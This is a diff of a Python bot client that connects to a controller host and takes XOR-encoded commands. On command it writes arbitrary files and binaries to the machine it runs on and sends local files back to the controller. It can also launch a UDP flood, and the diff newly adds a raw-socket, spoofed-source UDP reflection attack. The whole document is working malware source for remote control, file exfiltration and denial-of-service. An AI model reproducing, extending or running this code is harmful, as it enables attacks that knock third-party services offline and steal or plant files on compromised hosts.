@@ -1,10 +1,12 @@
 #!/usr/bin/python
+# -*- coding: <UTF-8> -*-
 
-import sys
+from socket import socket, IPPROTO_UDP, IPPROTO_RAW , SOCK_DGRAM, SOCK_STREAM, SOCK_RAW, AF_INET
 from subprocess import Popen, PIPE
-from socket import socket, SOCK_DGRAM, SOCK_STREAM, AF_INET
+from sys import exit as sysexit, argv
 from time import sleep
 from multiprocessing import Process
+from pinject import UDP, IP
 
 def make_en_STDOUT(STDOUT):
 	if STDOUT:
@@ -36,34 +38,44 @@ def make_en_bin_data(data):
 		en_data[i] ^=0x41
 	return en_data
 
+def get_en_data(sock, size):
+	data = sock.recv(size)
+	return make_en_data(data)
+
 def UDP_Flood(target_IP, target_Port,msg):
 	flood_sock = socket(AF_INET, SOCK_DGRAM)
 	while True:
 		flood_sock.sendto(bytes(msg), (target_IP,target_Port))
 		sleep(0.01)
 
+def UDP_Spoof(DEST_IP,DEST_PORT,SOURCE_IP,SOURCE_PORT,PAYLOAD):
+	UDP_HEADER = UDP(SOURCE_PORT,DEST_PORT,PAYLOAD).pack(SOURCE_IP,DEST_IP)
+	IP_HEADER = IP(SOURCE_IP,DEST_IP,UDP_HEADER,IPPROTO_UDP).pack()
+	return IP_HEADER+UDP_HEADER+PAYLOAD
+
+def UDP_Spoof_Send(TARGET_IP,TARGET_PORT,SPOOFED_IP,SPOOFED_PORT,PAYLOAD):
+	spoofed_packet = UDP_Spoof(TARGET_IP,TARGET_PORT,SPOOFED_IP,SPOOFED_PORT,PAYLOAD)
+	sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW)
+	while True:
+		sock.sendto(spoofed_packet, (TARGET_IP,TARGET_PORT))
+		sleep(0.01)
+
 def main():
 	try:
-		RHOST = sys.argv[1]
+		RHOST = argv[1]
 		RPORT = 9000
 	except:
 		print ("Must provide hotst")
-		sys.exit()
+		sysexit()
 	s = socket(AF_INET, SOCK_STREAM)
 	s.connect((RHOST,RPORT))
 
 	while True:
-		#recieve XOR encoded data
-		data = s.recv(2048)
-		
-		#XOR the data again with a '/x41' to get back to normal
-		en_data = make_en_data(data)
+		en_data = get_en_data(s,2048)
 		if en_data == 'killMe':
 			break
 		elif en_data == 'getFile':
-			print ("Started Transfer")
-			data = s.recv(2048)
-			en_data = make_en_data(data)
+			en_data = get_en_data(s,2048)
 			try:
 				fileToWrite = open(en_data,'w')
 				STDOUT = 'fcs'
@@ -73,14 +85,12 @@ def main():
 			try:
 				s.send(en_STDOUT)
 			except:
-                                s.close()
-				sys.exit()
+				s.close()
+				sysexit()
 			if STDOUT == 'fna':
 				continue
-			fSize = s.recv(1024)
-			fSize = make_en_data(fSize)
-			data = s.recv(int(fSize))
-			en_data = make_en_data(data)
+			fSize = get_en_data(s,1024)
+			en_data = get_en_data(s,int(fSize))
 			fileToWrite.write(en_data)
 			fileToWrite.close()
 			STDOUT = "fsw"
@@ -88,11 +98,10 @@ def main():
 			try:
 				s.send(en_STDOUT)
 			except:
-                                s.close()
-				sys.exit()
+				s.close()
+				sysexit()
 		elif en_data == "getBinary":
-			data = s.recv(1024)
-			en_data = make_en_data(data)
+			en_data = get_en_data(s,1024)
 			try:
 				binToWrite = open(en_data,'wb')
 				STDOUT = 'fcs'
@@ -102,12 +111,11 @@ def main():
 			try:
 				s.send(en_STDOUT)
 			except:
-                                s.close()
-				sys.exit()
+				s.close()
+				sysexit()
 			if STDOUT == 'fna':
 				continue
-			bSize = s.recv(1024)
-			bSize = make_en_data(bSize)
+			bSize = get_en_data(s,1024)
 			data = s.recv(int(bSize))
 			en_data = make_en_bin_data(data)
 			binToWrite.write(en_data)
@@ -117,11 +125,10 @@ def main():
 			try:
 				s.send(en_STDOUT)
 			except:
-                                s.close()
-				sys.exit()
+				s.close()
+				sysexit()
 		elif en_data == "sendFile":
-			data = s.recv(1024)
-			en_data = make_en_data(data)
+			en_data = get_en_data(s,1024)
 			try:
 				fileToSend = open(en_data,'r')
 				STDOUT = 'fos'
@@ -131,18 +138,19 @@ def main():
 			try:
 				s.send(en_STDOUT)
 			except:
-                                s.close()
-				sys.exit()
+				s.close()
+				sysexit()
 			if STDOUT == 'fna':
 				continue
 			fileCont = fileToSend.read()
+			sleep(0.1)
 			STDOUT = str(len(fileCont) + 1024)
 			en_STDOUT = make_en_STDOUT(STDOUT)
 			try:
 				s.send(en_STDOUT)
 			except:
-                                s.close()
-				sys.exit()
+				s.close()
+				sysexit()
 			sleep(0.1)
 			STDOUT = fileCont
 			fileToSend.close()
@@ -150,11 +158,9 @@ def main():
 			try:
 				s.send(en_STDOUT)
 			except:
-                                s.close()
-				sys.exit()
+				sysexit()
 		elif en_data == "sendBinary":
-			data = s.recv(1024)
-			en_data = make_en_data(data)
+			en_data = get_en_data(s,1024)
 			try:
 				binToSend = open(en_data,'rb')
 				STDOUT = 'fos'
@@ -164,8 +170,8 @@ def main():
 			try:
 				s.send(en_STDOUT)
 			except:
-                                s.close()
-				sys.exit()
+				s.close()
+				sysexit()
 			if STDOUT == 'fna':
 				continue
 			binCont = binToSend.read()
@@ -175,29 +181,53 @@ def main():
 			try:
 				s.send(en_STDOUT)
 			except:
-                                s.close()
-				sys.exit()
+				s.close()
+				sysexit()
 			sleep(0.1)
 			STDOUT = binCont
 			en_STDOUT = make_en_bin_STDOUT(STDOUT)
 			try:
 				s.send(en_STDOUT)
 			except:
-                                s.close()
-				sys.exit()
+				s.close()
+				sysexit()
 		elif en_data == "udpFlood":
-			data = s.recv(1024)
-			en_data = make_en_data(data)
+			#Get Target's IP and Port
+			en_data = get_en_data(s,1024)
 			en_data = en_data.split(":")
 			targetIP = en_data[0]
 			targetPort = int(en_data[1])
-			data = s.recv(1024)
-			en_data = make_en_data(data)
+			#Get Payload
+			en_data = get_en_data(s,1024)
 			p = Process(target=UDP_Flood, args=(targetIP,targetPort,en_data))
 			p.start()
 			while True:
-				data = s.recv(1024)
-				en_data = make_en_data(data)
+				en_data = get_en_data(s,1024)
+				if en_data == "KILL":
+					p.terminate()
+					break
+		elif en_data == "udpSpoof":
+			#Get Reflector's IP and Port
+			en_data = get_en_data(s,1024)
+			en_data = en_data.split(":")
+			targetIP = en_data[0]
+			targetPort = int(en_data[1])
+			#Get Target's IP and Port
+			en_data = get_en_data(s,1024)
+			en_data = en_data.split(":")
+			spoofedIP = en_data[0]
+			spoofedPort = int(en_data[1])
+			#Get size of Payload
+			en_data = get_en_data(s,1024)
+			payloadSize = int(en_data)
+			#Get Payload
+			en_data = get_en_data(s,payloadSize)
+			payload = en_data.encode('UTF-8')
+			#Start UDP Spoof Attack
+			p = Process(target=UDP_Spoof_Send, args=(targetIP,targetPort,spoofedIP,spoofedPort,payload))
+			p.start()
+			while True:
+				en_data = get_en_data(s,1024)
 				if en_data == "KILL":
 					p.terminate()
 					break
@@ -208,8 +238,8 @@ def main():
 			try:
 				s.send(en_STDOUT)
 			except:
-                                s.close()
-				sys.exit()
+				s.close()
+				sysexit()
 	s.close()
 
 #Start Here!
